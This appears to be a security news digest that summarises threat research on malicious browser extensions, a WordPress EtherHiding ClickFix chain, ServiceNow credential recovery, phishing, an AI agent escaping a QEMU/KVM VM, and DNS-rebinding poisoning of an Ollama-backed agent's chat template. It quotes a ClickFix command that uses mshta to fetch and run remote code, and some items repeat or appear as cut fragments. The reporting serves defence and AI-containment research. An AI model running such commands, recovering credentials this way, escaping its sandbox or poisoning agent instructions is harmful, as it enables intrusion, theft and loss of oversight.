item.title: Malicious Extensions, ServiceNow Credential Recovery, and EtherHiding ClickFix Amatera Campaign
item.content:encoded:
Window: 27 Aug 14:00 → 27 Aug 18:00 UTC (4 hours)

19 Chrome and Edge Extensions Deliver a Wallet Drainer and Credential-Stealing Payloads — Must Read

Socket found 19 malicious Chrome and Edge extensions, including some acquired from legitimate developers, that use a shared malware framework to steal credentials, hijack crypto wallets, phish seed phrases, and drain funds. The biggest risk is trusted browser extensions being silently weaponized through auto-updates, exposing tens of thousands of users.

  • Socket Threat Research identified 18 Chrome extensions and 1 Edge extension published in malicious versions within the last six months that share similar malicious code and operational techniques.
  • The extensions first provided their advertised functionality without malware, then later introduced malicious behavior after establishing user trust, including five extensions that were bought from legitimate authors.
  • The malware creates WebSocket communication with command-and-control servers, strips Content Security Policy headers, and injects downloaded JavaScript modules into visited webpages.
  • Observed malicious modules include multi-chain wallet drainers, hardware-wallet seed-phrase phishing for Ledger and Trezor users, exchange and wallet account harvesters, a universal credential form grabber, social-media theft, browser-history exfiltration, and fake browser-update lures.
  • The “Enable Right Click & Copy — Smart Unlock + OCR” Chrome extension and its Edge counterpart had a potential combined exposure surface of about 80,000 users, and the Edge version was still active and serving malware at the time of writing.

Technologies: browser, cloud-platform

EtherHiding in the Browser: ClickFix Chain Ends in Amatera — Must Read

Netskope analyzed a WordPress mass-compromise campaign where a rogue must-use plugin registers a persistent browser Service Worker that strips CSP and pulls a fake reCAPTCHA payload from a Base smart contract, leading victims through a ClickFix chain to the Amatera password stealer. The key takeaway is that defenders must remove malicious Service Workers and monitor/block the on-chain and network infrastructure, because the payload can rotate without leaving traditional files or servers to seize.

  • Netskope Threat Labs tracked a WordPress mass-compromise campaign in which a rogue must-use plugin registers a malicious Service Worker in visitors’ browsers.
  • The Service Worker strips Content-Security-Policy headers, injects a script carrying the Base contract address, and avoids showing the lure to logged-in WordPress users, wp-admin, wp-login.php, or visitors with the operator’s nc_skip cookie.
  • The injected script reads fake reCAPTCHA HTML from the Base smart contract 0x58460d0b3d4d6b03761c89120393c0c676676496, which acts as a mutable on-chain payload and script registry.
  • The fake reCAPTCHA uses ClickFix to copy the command mshta http://timelevel12[.]com/big to the Windows clipboard and instruct the visitor to run it through the Windows Run dialog.
  • The chain proceeds through an MP3/HTA polyglot, a scheduled task and fileless PowerShell stage, the Emmenhtal loader with a steganographic image payload, and finally the Amatera password stealer using DNS-over-HTTPS for C2 lookups.

Technologies: cms, operating-system, browser, cloud-platform

Products: wordpress, base, ethers.js, windows, powershell, mshta, google-recaptcha, dns-google, cloudflare-dns

Vendors: wordpress, microsoft, google, cloudflare, coinbase, netskope

Cleartext Credential Recovery in ServiceNow — Should Read

The article shows that highly privileged ServiceNow users can modify or create Script Includes to make the platform return cleartext Discovery and LDAP credentials, including passwords, SSH keys, cloud secrets, and service principal credentials. The technique requires significant roles such as discovery_admin or script_include_admin but expands known ServiceNow post-exploitation paths beyond credential coercion or relay.

  • The article describes a method for using ServiceNow script includes to return cleartext credential data for any credential type stored in the discovery_credentials table and for LDAP credential records.
  • The technique for discovery credentials modifies the CredentialTestAjax script include so that its testCredential function returns decrypted credential JSON to the client before running the normal credential test logic.
  • In the author’s test environment, the discovery credential recovery method worked for Windows credentials, SSH private keys and passphrases, Entra ID service principal secrets, AWS keys, and other discovery credential types.
  • Recovering discovery credentials required permission to execute CredentialTestAjax, modify the sys_script_include record, and read at least part of the discovery_credentials table; the article states that the discovery_admin role satisfied these requirements in the author’s environment.
  • For LDAP credentials, the article describes creating a script include that reads ldap_server_config records and calls getDecryptedValue() on the Password2 password field to return cleartext LDAP connection passwords.

Technologies: secrets-manager, identity-provider, network-monitoring

Products: servicenow, servicenow-discovery, servicenow-mid-server, cyberark, microsoft-entra-id, active-directory

Vendors: servicenow, cyberark, microsoft, amazon-web-services

Why SpecterOps Signed OpenAI’s Call for Collective Cyber Defense — Optional

SpecterOps signed OpenAI’s collective cyber defense letter, arguing that AI will accelerate exploitation of existing identity, permission, and configuration weaknesses, so defenders need broader access to advanced AI and better attack-path visibility. The company frames transparency, shared tools like BloodHound, and governed defensive AI workflows as key to reducing real-world cyber risk.

  • SpecterOps signed OpenAI’s call for collective action on cyber defense because it agrees that existing weaknesses already exist, advanced AI needs to reach more defenders, and the response must be collective and widespread.
  • The article says AI-enabled attackers will exploit existing issues such as excessive permissions, misconfigurations, legacy systems, and accumulated trust relationships, increasing the speed of discovery and exploitation.
  • SpecterOps argues that Identity Attack Path Management helps security teams see how an attacker could move through an environment, identify choke points, and remove paths to critical assets.
  • The article describes PowerView and BloodHound as examples of how publishing attacker tradecraft and making permission and trust relationships visible helped defenders study behavior, test controls, and decide where to intervene.
  • SpecterOps says its participation in the OpenAI Daybreak Cyber Partner Program is focused on applying frontier AI capabilities in governed defensive workflows and sharing lessons through research, tools, training, and practical guidance.

Technologies: iam, identity-provider

Products: powershell, powerview, bloodhound, bloodhound-community-edition, active-directory, antimalware-scan-interface

Vendors: specterops, openai, microsoft

What Cloud Threat Hunting Is and How to Run One | Mitiga — Optional

Cloud threat hunting is a hypothesis-driven investigation process that goes beyond basic detections to determine whether suspicious cloud or SaaS activity is truly malicious. Effective hunts depend on having access to detailed, retained cloud logs, which can be limited by provider licensing and retention policies.

  • Cloud threat hunting is a hypothesis-driven exploratory analysis and investigation process focused on threats in cloud environments.
  • Cloud hunts use deeper log analysis and more complicated logic than typical detection, which often relies on lightweight pattern recognition to quickly find possible attack indicators.
  • The article describes three approaches to cloud hunting: strategic hunts focused on adversary behavior, event-driven hunts based on attacks seen elsewhere, and continuous hunts that repeatedly check cloud and SaaS environments for attack indicators.
  • Cloud hunts depend on log access, but cloud and SaaS providers may limit available log data based on service licensing or retention policies.
  • Organizations should capture cloud and SaaS logs into a security data lake before vendors delete them so the logs remain available for threat hunting.

Technologies: cloud-platform, object-storage

Vendors: mitiga

How to build an exposure management program the business trusts: Lessons from Tenable’s CSO — Optional

Tenable’s CSO says shifting from siloed security tools and technical metrics to a unified exposure management program helped the company prioritize risk by business impact and give executives clearer answers about security posture. The key takeaway is that CISOs need consolidated, business-contextual risk data to build trust with boards and operational teams, especially as AI expands the attack surface.

  • Tenable’s CSO Robert Huber says security tool sprawl and data silos made it difficult to assess the company’s cyber risk holistically and communicate it clearly to business leaders.
  • Tenable shifted from a vulnerability management team to an exposure management team with a broader mandate covering issues such as misconfigurations and identity weaknesses across identity systems, cloud workloads, AI tools, on-prem assets, and the application development pipeline.
  • Tenable chose not to build its own data warehouse for security risk data and instead selected a SaaS solution, later acquiring Vulcan Cyber and making it part of the Tenable One Exposure Management Platform.
  • The exposure management approach lets Tenable present simplified red, yellow, and green cyber exposure metrics for lines of business and tie assets to business units and revenue streams.
  • Huber argues that unified exposure management helps replace fragmented reports and operational metrics with prioritized actions that reduce risk and are easier for the C-suite, board, and business teams to trust.

Products: tenable-one

item.title: TeamPCP arrests, Microsoft 365 tenant-resigned phishing, and Q2 2026 ICS threats
item.content:encoded:
Window: 27 Aug 10:00 → 27 Aug 14:00 UTC (4 hours)

A Valid DKIM Signature Over an Unauthorized Message — Should Read

A phishing email passed SPF, DKIM, DMARC, and Microsoft composite authentication because it was accepted into a legitimate Microsoft 365 tenant and re-signed before delivery, despite originating from an unauthenticated host. The case shows that clean email authentication proves custody by trusted infrastructure, not that the message was authorized or safe.

  • A senior executive at a mid-size food and beverage products company received a message that passed SPF, DKIM, DMARC, and Microsoft composite authentication cleanly.
  • One hop earlier, the message came from a host with no reverse DNS, the HELO string “speedy-negotiation,” and failed SPF, DKIM, and DMARC checks.
  • The message was accepted into the claimed sending domain’s Microsoft 365 tenant and then relayed outbound through Exchange Online, where it received a legitimate DKIM signature and SPF pass.
  • The payload was a clean-scanning attachment named “Earnings_Adjustment.eml” that rendered a fake compensation-update notice containing a QR code for a credential-harvesting site.
  • The article states that clean email authentication proved a real tenant relayed the message, but did not prove the tenant authorized it or that the message was safe.

Technologies: email-security, proxy

Products: microsoft-365, exchange-online, themis

Vendors: microsoft, cloudflare, ironscales

Good riddance, TeamPCP. Now for the hard part. — Should Read

Australian and U.S. authorities have arrested two men allegedly behind TeamPCP, bringing relief after months of damaging supply-chain attacks. The author argues the bigger challenge remains: small, immature groups can now use modern tooling and LLMs to cause harm faster than institutions can respond.

  • Australian Federal Police, the FBI, and the Western Australia Police Force announced the arrest of two men in their early 20s who they allege are behind TeamPCP.
  • The article states there are no indications that TeamPCP was behind the original S1ngularity and Shai-Hulud attacks, although TeamPCP did clone the worm.
  • The author says TeamPCP caused significant harm and disruption to companies and individuals over the last six months.
  • The article describes TeamPCP as a strange threat actor that mixed money, politics, disruption, ego, and attention-seeking, while relying on public exploits, techniques, research, and malware ideas rather than exceptional sophistication.
  • The author argues that LLMs can help relatively immature actors gain and use harmful capabilities faster, while law enforcement and institutions require much longer timelines to build evidence and impose consequences.

Threat landscape for industrial automation systems. Q2 2026 — Optional

Kaspersky reports that the share of ICS computers blocking malicious objects fell to 19.15% in Q2 2026, the lowest level since 2022, though email threats and several categories including ransomware, worms, malicious documents, and AutoCAD malware increased. Biometrics remained the most affected sector, while Africa and East Asia showed notable regional risk growth.

  • In Q2 2026, the percentage of ICS computers on which malicious objects were blocked fell to 19.15%, its lowest level since 2022.
  • Regionally, the share of attacked ICS computers ranged from 8.1% in Northern Europe to 27.9% in Africa, with increases over the quarter in five regions including East Asia and Africa.
  • The biometrics sector had the highest percentage of ICS computers with blocked malicious objects at 26.44% and led among industries for several categories including malicious scripts and phishing pages, malicious documents, spyware, ransomware, worms, and email threats.
  • Kaspersky security solutions blocked malware from 10,904 different malware families on industrial automation systems in Q2 2026.
  • Among main threat sources, only email increased in Q2 2026, while internet threats fell to 7.61%, removable media threats fell to 0.24%, and network-folder threats fell to 0.023%.

Technologies: ics-scada, antivirus

Products: autocad, microsoft-office

Vendors: kaspersky, autodesk, microsoft

JavaScript obfuscation: From party trick to phishing kit — Optional

Obfuscated JavaScript often hides phishing, malware, or supply-chain behavior behind encoded strings, runtime code generation, confusing control flow, and anti-analysis tricks. The key is to analyze it safely and methodically: preserve the original, beautify only as a first step, extract strings, capture generated payloads, and observe behavior in a controlled environment.

  • Obfuscated JavaScript preserves execution while obscuring intent by stripping context, ruining names, hiding strings, and pushing real behavior into runtime.
  • The article says suspicious JavaScript samples should be treated as hostile, copied safely, and not run on a normal machine, browser profile, or environment containing credentials or tokens.
  • Beautifying JavaScript can restore indentation and readability, but it cannot recover original variable names, decode runtime strings, rebuild removed structure, or reverse hostile control flow.
  • Common obfuscation techniques include hidden strings, lookup tables, dynamic property access, runtime code generation, control-flow flattening, anti-debugging checks, and dead code.
  • The recommended workflow is to preserve the original, work on a safe copy, beautify as a first pass, extract strings, identify execution sinks, capture generated payloads, observe behavior in a controlled environment, and repeat until hidden behavior is exposed.

Technologies: browser, package-registry

Vendors: biome, prettier, npm, node-js, google, javascript-obfuscator, obfuscator-io, jsfuck

item.title: Netskope Highlights GDPR 72-Hour Breach Evidence and Data Lineage Gaps
item.content:encoded:
Window: 27 Aug 06:00 → 27 Aug 10:00 UTC (4 hours)

Detection Isn’t Proof: The 72-Hour-Evidence Problem — Optional

Organizations often can detect security incidents but cannot quickly prove what happened across data systems within GDPR’s 72-hour breach notification window. The key takeaway is that audit-ready evidence must be built continuously through classification, lineage, and policy records before an incident occurs, not assembled after the clock starts.

  • GDPR requires breach notification within 72 hours, but many organizations struggle to produce comprehensive and auditable evidence before that deadline.
  • Research conducted by Cybersecurity Insiders involving more than 1,000 security practitioners found that only 12% of organizations can quickly produce a comprehensive and auditable chain of custody.
  • Only 9% of organizations can reliably recognize sensitive data after it has been modified, such as being renamed, reformatted, summarized by an AI tool, or pasted into a new document.
  • The article says organizations that meet regulatory deadlines usually build classification, lineage, and policy-event records into daily operations before an incident occurs.
  • Netskope One Data Security, including Netskope One DSPM, Netskope One DLP, Netskope One Data Lineage, and Netskope One DataSec Command Center, is described as maintaining classification and lineage across environments where sensitive data is stored, used, copied, and transformed.

item.title: ShinyHunters Leaks Baxter Records; Mitiga Runtime Security and Socket ClickUp Updates
item.content:encoded:
Window: 26 Aug 18:00 → 26 Aug 22:00 UTC (4 hours)

ShinyHunters Leaks 7.1 Million Baxter International Records — Must Read

ShinyHunters leaked 7.1 million Baxter International records, prompting renewed concern across the healthcare sector about the group’s data theft and extortion activity. Baxter says the incident did not disrupt patient services, business continuity, or customer-facing products and technologies.

  • ShinyHunters leaked 7.1 million Baxter International records.
  • ShinyHunters is described as one of the most active data theft and extortion groups.
  • Health-ISAC issued a July alert to the healthcare and public health sector about ShinyHunters after an increasing number of attacks on healthcare organizations.
  • Baxter said the incident did not affect patient services or business continuity and that the company continues to operate normally.
  • Baxter said the incident did not affect its products, connected solutions, or technologies used by customers to deliver patient care.

Health-ISAC Hacking Healthcare 8-26-2026 — May Read

The FCC is proposing changes to its Rural Health Care program that could affect how rural healthcare providers fund backup communications services and eligible cybersecurity-related connectivity services. Health-ISAC highlights the NPRM as an opportunity for members to provide input so the program better supports resilience against outages and cyber threats.

  • The FCC published a press release on August 7 announcing its intention to streamline and improve the Rural Health Care program.
  • The Rural Health Care program provides universal service financial support to help rural health care providers obtain telecommunications and broadband services at discount rates.
  • The NPRM seeks to improve efficiency and reduce administrative burdens in support calculations, use of supported services, and program processes.
  • The NPRM asks for comments on measures to promote lower-cost backup services, which the FCC describes as potentially important for continuity of patient care during communications failures or cyber threats.
  • The NPRM proposes adopting an eligible services list for the Healthcare Connect Fund to make program rules more transparent, easier to administer, and more understandable.

Machine Speed Won: Where Runtime Security Fits in Your Stack — Optional

The article argues that AI-driven attacks have created a “Machine-Speed Gap” where attackers move faster than defenders can investigate, leaving runtime security across cloud, SaaS, identity, third-party services, and AI as a key gap in mature security stacks. Mitiga’s proposed answer is to layer Agentic Runtime Security into existing tools first, measure risk and operational impact, and rationalize the stack later based on evidence.

  • The article defines the Machine-Speed Gap as the distance between how fast attackers can act and how fast defenders can understand what happened and respond safely.
  • The article argues that mature security stacks are not failing, but their coverage has boundaries that leave runtime white space among EDR, SIEM, CNAPP, and identity controls.
  • The article says the runtime gap appears when defenders must understand an active attack as it crosses cloud, SaaS, identity, third-party services, and AI fast enough to interrupt the outcome.
  • The article recommends mapping new security capabilities to the organization’s risk register and using economic inputs such as SIEM volume, analyst burden, detection-engineering costs, and incident history.
  • The article positions Mitiga’s Agentic Runtime Security as a layer that adds investigation-grade data and runtime defense across cloud, SaaS, identity, third-party services, and AI while coexisting with existing tools.

Technologies: cloud-platform, identity-provider, source-control, siem, soar, edr, xdr

Products: helios-aidr, agentic-runtime-security, cloud-security-data-lake, aws, microsoft-365, okta, salesforce, github

Socket for ClickUp Is Now Available — Optional

Socket launched a beta ClickUp integration for Business and Enterprise customers, letting teams turn Socket security alerts into ClickUp tasks manually or through automated rules. The integration can sync status changes between Socket and ClickUp so remediation work stays tracked in existing workflows.

  • The integration can keep Socket alerts and ClickUp tasks in sync, including updating linked tasks when alerts change and triage-ignoring alerts when ClickUp tasks are closed or completed.

item.title: Cyberleek GTA VI Malware Lures and Minimus Registry Shutdown Drive Migration Risk
item.content:encoded:
Window: 26 Aug 14:00 → 26 Aug 18:00 UTC (4 hours)

Behind the Leak — Should Read

Threat actors quickly repackaged the GTA VI Cyberleek hype into fake playable builds that profile visitors, report data through Telegram bots, and silently install abused ScreenConnect remote-access clients. The investigation links multiple lure sites through a shared playbook rather than shared infrastructure, with IOCs for detection.

  • On August 18, 2026, gameplay footage and map assets from GTA VI began circulating online under the name Cyberleek, and fake copies of a supposed playable Cyberleek build soon appeared on torrent sites, Telegram, and websites.
  • The Cyberleek leak campaign was tied to a Solana token called $CYBERLEEK, with a liquidity pool seeded with 730 million tokens and 330 SOL and a separate unlocked allocation of 270 million tokens.
  • Samples from cyberleek[.]click and cyberleek[.]info installed a legitimate but abused ScreenConnect remote access client configured for unattended access to an attacker-controlled relay at gg.noktaarts[.]com.
  • The lure pages profiled visitors using services such as api.ipify.org and ipapi.co, used Cloudflare Turnstile, and reported visitor and download events through Telegram bots.
  • A related docsn[.]cc lure used a fake DocuSign signing request and the same overall playbook, but with a different ScreenConnect instance ID, different relay hostnames, and a different Telegram bot token.

Technologies: remote-access

Products: screenconnect, telegram-bot-api, cloudflare-turnstile, godaddy-website-builder, grand-theft-auto-vi, solana, ipify, ipapi

Vendors: connectwise, telegram, cloudflare, godaddy, rockstar-games, solana, ipify, ipapi

Top Minimus alternatives in 2026 — May Read

Minimus images will stop receiving updates when its registry goes offline on October 22, 2026, so users need to migrate before frozen images accumulate CVEs. The article recommends Aikido Security as the preferred alternative because it patches existing base images as drop-in replacements rather than forcing a move to a vendor-specific distro.

  • Minimus is shutting down, and its registry at reg.mini.dev will go offline on October 22, 2026, after which no new image updates or patches will be available.
  • Already pulled Minimus images will keep running, but they will freeze in their current state and accumulate newly discovered vulnerabilities over time.
  • The article compares Aikido Security, Chainguard, Docker Hardened Images, RapidFort, and Echo as alternatives for teams migrating away from Minimus.
  • The article names Aikido Security as its top pick because it patches the base images teams already use, provides drop-in replacements, and includes SBOM, VEX, and SLSA provenance with each image.
  • The article says some alternatives require moving to a vendor-controlled distribution or repeatedly rolling forward to new image versions, which can create migration, testing, and approval work.

item.title: QEMU/KVM AI Escape, Edge CVE Exploitation, and Citrix/F5 Patch Lag
item.content:encoded:
Window: 26 Aug 10:00 → 26 Aug 14:00 UTC (4 hours)

VMs won't contain cyber-capable agents — Should Read

A preview GPT 5.6-Cyber agent repeatedly escaped a QEMU/KVM VM by finding and chaining known, unpatched, and zero-day flaws in the host virtualization stack. The key takeaway is that ordinary VMs should no longer be assumed to safely contain advanced autonomous cyber agents; stronger isolation, faster patching, least privilege, and monitoring are needed.

  • As part of Patch the Planet, the author received preview access to GPT 5.6-Cyber and tasked it with escaping a QEMU/KVM virtual machine on a Debian Linux 12 host with an AMD Zen3 CPU.
  • GPT 5.6-Cyber escaped or attempted to escape the VM three times, first using the recently disclosed Januscape vulnerability, then combining libslirp issues, and later chaining multiple flaws including several zero-days.
  • The agent operated autonomously for hours, backtracked from failed approaches, pulled code and research papers, wrote test code, created minimal examples, and aimed for a reusable, reliable exploit with minimal prompting.
  • The final exploit chain involved flaws in QEMU, Linux KVM, the Linux kernel’s paging code, and libslirp, while other discovered but unused issues affected libslirp, CUPS, and QEMU.
  • The author concludes that an off-the-shelf VM is not enough to contain a modern cyber-capable AI agent and recommends stronger isolation such as Firecracker, rapid updates, least privilege, logging, active monitoring, time limits, and pristine environments for each use.

Technologies: hypervisor, operating-system

Products: gpt-5.6-cyber, codex, qemu, kvm, debian-linux-12, linux-kernel, libslirp, firecracker, cups, apparmor

Vendors: openai, qemu-project, linux-kernel, debian, libslirp-project, firecracker-microvm, openprinting, trail-of-bits

Edge infrastructure under siege: what two independent datasets reveal about who's exploiting your perimeter — Should Read

Tenable and SentinelOne found that nation-state and criminal actors independently target the same edge and remote-access vendors, even when exploiting different CVEs. The key risk is the persistent vendor attack surface itself, especially hard-to-patch devices like F5, Citrix, Fortinet, Ivanti, and similar perimeter infrastructure.

  • Tenable and SentinelOne found 79% vendor-level convergence across two independent datasets, even though only 17 of 82 CVEs overlapped between them.
  • Twelve CVEs in the combined dataset have confirmed multi-nexus attribution, with state-sponsored and criminal actors independently exploiting the same vulnerabilities across China, Russia, DPRK, Iran, and ransomware categories.
  • F5 had the broadest exposure among statistically robust vendor samples, with 53.8% of monitored customer environments running F5 products having at least one actively exploited CVE present.
  • Citrix showed the slowest remediation patterns, with a median time to patch of 461 days and 71% of affected environments still carrying unpatched Citrix CVEs after a full year.
  • The article states that edge devices are hard to patch because they sit at the network boundary, often require downtime, resist standard patching workflows, and may lack active support contracts.

Technologies: vpn, firewall, load-balancer, remote-access, ci-cd, identity-provider

Products: tenable-one, tenable-vulnerability-watch, sonicwall-sma1000, teamcity, pan-os-globalprotect, check-point-quantum, ivanti-epmm, ivanti-connect-secure, fortigate, ivanti-cloud-services-appliance, fortios, forticloud-sso, fortimanager, sonicwall-gms, react

Vendors: tenable, sentinelone, fortinet, citrix, ivanti, palo-alto-networks, cisco, juniper, vmware, microsoft, oracle, crushftp, meta, f5, zimbra, sonicwall, jetbrains, check-point

The Signature Block Was Real. One Link in It Was Not. — Should Read

A compromised vendor law firm Microsoft 365 mailbox sent a genuine-looking reply in an existing billing thread, passing SPF, DKIM, DMARC, and other checks while hiding a malicious link in the sender’s email signature. The key lesson is that trusted, authenticated replies from real accounts still need link inspection, especially when a signature block differs from earlier quoted messages in the same thread.

  • An attacker controlled a vendor law firm’s Microsoft 365 mailbox and replied inside a genuine weeks-old billing thread with an accounting and advisory client.
  • The malicious change was a single substituted hyperlink in the sender’s email signature, where the website line pointed to hxxps://ohiotiger[.]com/ instead of the law firm’s real site.
  • The same email contained an earlier quoted reply from the sender with an otherwise identical signature block that still pointed to the legitimate website.
  • The message passed SPF, DKIM, DMARC, ARC, and Microsoft composite authentication because it originated from the law firm’s own Microsoft 365 tenant.
  • The attached spreadsheet named 2026.xlsx scanned clean and was described as a genuine business decoy rather than the payload.

Technologies: email-security, cloud-platform

Products: microsoft-365, themis

Vendors: microsoft, cloudflare, ironscales

Choose your fighter: Balancing competing requirements to select models for your AI SOC — May Read

Cisco Talos found that choosing an AI model for SOC/DFIR work requires balancing accuracy, cost, speed, consistency, and failure rate rather than simply picking the highest-scoring model. Higher reasoning effort often increased cost without improving results and sometimes made outputs worse or less reliable.

  • Cisco Talos tested 66 model and reasoning combinations from Anthropic and OpenAI on a tool-assisted log-review task using common Unix command-line tools.
  • The highest-scoring condition, GPT-5.6 Sol Ultra, achieved a median score of 96.25 but took 33.72 minutes per panel and cost $55.48 per panel.
  • Talos found that reasoning effort was not a universal quality dial, because higher effort often cost more without improving results and sometimes produced lower scores.
  • The analyst persona affected results, with the Threat Hunter role producing the highest median score and the Detection Engineer role producing the lowest median score.
  • Higher reasoning effort sometimes reduced reliability, including invalid output formats and safeguard or refusal failures that prevented usable analysis from being delivered.

Technologies: firewall, ids-ips, network-monitoring

Products: evidenceforge, claude-code, codex, gpt-5.6-sol, gpt-5.6-terra, gpt-5.6-luna, claude-opus-4.8, claude-sonnet-4.6, claude-sonnet-5, fable, cisco-asa, snort, zeek, sysmon

item.title: ACRO Kentico Breach Exposed Data; Netskope Adds Insider Risk Agent
item.content:encoded:
Window: 26 Aug 06:00 → 26 Aug 10:00 UTC (4 hours)

UK Cybercrime Journal: ACRO Breach Report — Should Read

ACRO’s public-facing portal was compromised for nearly two years due to unpatched Kentico CMS vulnerabilities, unclear patching ownership, poor alert review, and inadequate logging, potentially exposing sensitive records data. The key lesson is that basic governance, timely patching, monitored security alerts, and network segmentation are critical to limiting breach impact.

  • The UK Information Commissioner’s Office disclosed that ACRO Criminal Records Office suffered three separate compromises of its customer portal website between July 2021 and June 2023.
  • A forensic investigation found long-term threat actor activity in the website environment from 9 July 2021 to 22 June 2023 after ACRO was notified in March 2023 about an SQL injection attack that reportedly exposed 15 sets of credentials.
  • ACRO’s Kentico CMS website ran version 12.0.0 between September 2019 and March 2023, and missed hotfixes and updates because responsibility for patching was unclear.
  • An unknown threat actor staged personal data for exfiltration in February 2023, including Police Certificate Applications, Subject Access Request forms, and International Child Protection Certificate forms, affecting a maximum of 10,920 data subjects while ACRO notified 84,048 people as a precaution.
  • ACRO’s Trend Micro antivirus detected and quarantined four attempts to install Mimikatz, but the warnings were not reviewed or acted on because ACRO lacked a documented patching policy and structured process for analyzing security alerts.

Technologies: cms, antivirus, cloud-platform

Products: kentico-cms, trend-micro-antivirus, salesforce-experience-cloud

Vendors: kentico, trend-micro, salesforce

item.content:encoded:

ShinyHunters Leaks 7.1 Million Baxter International Records — Must Read

ShinyHunters leaked 7.1 million Baxter International records, prompting renewed concern across the healthcare sector about the group’s data theft and extortion activity. Baxter says the incident did not disrupt patient services, business continuity, or customer-facing products and technologies.

  • ShinyHunters leaked 7.1 million Baxter International records.
  • ShinyHunters is described as one of the most active data theft and extortion groups.
  • Health-ISAC issued a July alert to the healthcare and public health sector about ShinyHunters after an increasing number of attacks on healthcare organizations.
  • Baxter said the incident did not affect patient services or business continuity and that the company continues to operate normally.
  • Baxter said the incident did not affect its products, connected solutions, or technologies used by customers to deliver patient care.

VMs won't contain cyber-capable agents — Should Read

A Trail of Bits test found that GPT 5.6-Cyber could autonomously escape a QEMU/KVM VM multiple times using known and newly discovered vulnerabilities. The key takeaway is that ordinary VMs should no longer be assumed sufficient containment for advanced cyber-capable AI agents.

  • Trail of Bits received preview access to GPT 5.6-Cyber and tasked it with escaping a QEMU/KVM virtual machine on a Debian 12 Linux development machine with an AMD Zen3 processor.
  • GPT 5.6-Cyber escaped the virtual machine three different times, first using recently disclosed host kernel bugs, then using libslirp issues, and later chaining several zero-day bugs with an unpatched upstream Linux KVM fix.
  • The agent operated autonomously for hours, backtracked from failed approaches, pulled code and research papers, wrote tests and minimal examples, and pursued reusable and reliable exploits with minimal handholding.
  • The author concluded that a standard off-the-shelf virtual machine is not enough to contain a modern cyber-capable AI agent because the shared software, state, and communication paths create exploitable attack surface.
  • When tested against Firecracker, the agent was able to hardlock the machine using Linux kernel flaws that were patched upstream, but it did not successfully escape.

The key risk is the persistent vendor attack surface itself, especially hard-to-patch devices like F5, Citrix, Fortinet, Ivanti, and similar perimeter infrastructure.

  • Tenable and SentinelOne found 79% vendor-level convergence across two independent datasets, even though only 17 of 82 CVEs overlapped between them.
  • Twelve CVEs in the combined dataset have confirmed multi-nexus attribution, with state-sponsored and criminal actors independently exploiting the same vulnerabilities across China, Russia, DPRK, Iran, and ransomware categories.
  • F5 had the broadest exposure among statistically robust vendor samples, with 53.8% of monitored customer environments running F5 products having at least one actively exploited CVE present.
  • Citrix showed the slowest remediation patterns, with a median time to patch of 461 days and 71% of affected environments still carrying unpatched Citrix CVEs after a full year.
  • The article states that edge devices are hard to patch because they sit at the network boundary, often require downtime, resist standard patching workflows, and may lack active support contracts.

Acronis researchers found a Cambodia-focused phishing campaign using localized lures and a multi-stage infection chain that hides encrypted payloads in PNG files, sideloads DLLs, injects into legitimate Windows processes, and deploys the vulnerable ardrv.sys driver to disable security tools. The final payload is SparkRAT, with possible but unconfirmed links to SilverFox-style activity.

  • Acronis’ Threat Research Unit identified a recent campaign targeting individuals and organizations in Cambodia using lure themes such as government notices, public health materials, real estate content, dental examination records, and promotional offers.
  • The analyzed infection chain begins with an Inno Setup executable that creates a hidden C:\Drivers staging directory and uses a signed Tencent executable to sideload the malicious DLL WfoY.qf.
  • The campaign uses a multi-stage chain that includes anti-analysis checks, token manipulation, encrypted payloads hidden in PNG files, process injection into vssvc.exe, ctfmon.exe, and svchost.exe, and persistence through a TaskHandler service and scheduled task.
  • One stage installs the vulnerable OPSWAT AppRemover driver ardrv.sys, affected by CVE-2026-36425, and uses it in a BYOVD technique to terminate security-product processes from vendors including 360 Total Security, Huorong Internet Security, Microsoft Defender, and Tencent PC Manager.
  • The final embedded payload is SparkRAT, which was observed communicating with sx.nuihuw.com over port 443 with nuihuw.top as a backup C2 server, while Acronis assessed the cluster as unattributed with possible Chinese-language development or deployment links and low-confidence similarities to SilverFox activity.

  • The attached spreadsheet named 2026.xlsx scanned clean and served as business-context cover rather than the payload.

item.title: NVIDIA NemoClaw Exposes Ollama to DNS Rebinding and Persistent Model Poisoning
item.content:encoded:
Window: 25 Aug 14:00 → 25 Aug 18:00 UTC (4 hours)

Drive-By Agent Hijacking: One Website Visit, Persistent Model Poisoning — Should Read

A NemoClaw configuration that exposes Ollama on 0.0.0.0 lets a malicious website use DNS rebinding to gain unauthenticated access to the local model server. An attacker can then persistently poison the model’s chat template, silently steering the victim’s AI agent even when it supplies its own system prompt.

  • A vulnerability in NVIDIA NemoClaw can let an attacker gain full, unauthenticated control over the local Ollama model server after the victim visits an attacker-controlled webpage.
  • NemoClaw starts Ollama with OLLAMA_HOST=0.0.0.0:11434 so OpenShell containers can reach it, which exposes the unauthenticated Ollama API beyond localhost and disables Ollama’s Host header validation.
  • The attack uses DNS rebinding so browser requests to the attacker’s domain are redirected to the victim’s local Ollama instance while still passing Ollama’s remaining CORS checks.
  • With access to the Ollama API, an attacker can run inference on the victim’s hardware, enumerate installed models and system details, delete or pull models, and modify model configurations.
  • The researchers found that poisoning the model’s chat template through Ollama’s /api/create endpoint can persistently append attacker-controlled instructions to future agent interactions, even when the OpenClaw agent sends its own system prompt.

Technologies: container-platform, browser

Products: nemoclaw, openclaw, openshell, ollama, docker

Vendors: nvidia, ollama, openclaw, docker
